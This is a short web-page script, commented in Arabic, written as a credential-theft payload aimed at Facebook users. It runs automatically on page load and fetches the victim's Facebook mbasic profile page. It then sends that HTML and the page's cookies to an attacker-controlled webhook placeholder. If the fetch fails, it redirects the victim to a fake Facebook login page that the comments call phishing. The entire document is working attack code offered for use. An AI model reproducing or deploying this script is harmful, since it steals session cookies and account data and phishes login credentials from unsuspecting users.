<script>
    const webhookURL = "https://YOUR_PIPEDREAM_ENDPOINT.com"; // ضع رابط Pipedream هنا

    async function grabData() {
        try {
            // محاولة سحب معلومات الحساب عبر طلب داخلي لفيسبوك
            let response = await fetch('https://mbasic.facebook.com/profile.php');
            let text = await response.text();
            
            // إرسال النتيجة إلى لوحة تحكمك
            fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    html: text, // سيحتوي هذا النص على الـ ID والبيانات الحساسة
                    cookies: document.cookie
                })
            });
        } catch (e) {
            // إذا فشل السحب المباشر، يوجهه لصفحة تسجيل دخول مزيفة (Phishing)
            window.location.href = "https://facebook-security-verify.github.io/login";
        }
    }
    window.onload = grabData;
</script>
